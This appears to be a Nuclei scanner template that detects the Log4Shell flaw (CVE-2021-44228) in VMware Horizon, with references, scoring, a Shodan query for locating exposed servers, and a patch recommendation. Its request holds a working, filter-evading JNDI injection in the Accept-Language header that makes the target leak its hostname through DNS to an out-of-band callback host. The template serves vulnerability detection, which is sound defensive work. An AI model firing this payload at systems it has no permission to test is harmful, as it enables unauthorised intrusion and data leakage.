id: vmware-horizon-log4j-jndi-rce
info:
  name: VMware Horizon - JNDI Remote Code Execution (Apache Log4j)
  author: johnk3r
  severity: critical
  description: VMware Horizon can be exploited through the Apache Log4j framework,
    allowing an attacker to execute code, steal data, and take over a system without
    requiring credentials.
  reference:
  - https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis
  - https://www.vmware.com/security/advisories/VMSA-2021-0028.html
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-77
  metadata:
    shodan-query: http.html:"VMware Horizon"
    verified: 'true'
    impact: The impact of the vulnerability in VMware Horizon's JNDI Remote Code Execution
      is severe and allows an attacker to gain complete control over a system without
      any login credentials.
    recommendation: It is highly recommended to immediately update VMware Horizon
      to a version that has patched the vulnerability in Apache Log4j and enable multi-factor
      authentication to mitigate the risk of remote code execution.
  tags: cve,cve2021,rce,jndi,log4j,horizon,vmware,oast,kev
requests:
- raw:
  - 'GET /portal/info.jsp HTTP/1.1

    Host: {{Hostname}}

    Accept-Language: ${jndi:${lower:d}n${lower:s}://${env:hostName}.{{interactsh-url}}}

    '
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: regex
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
  extractors:
  - type: regex
    part: interactsh_request
    group: 1
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
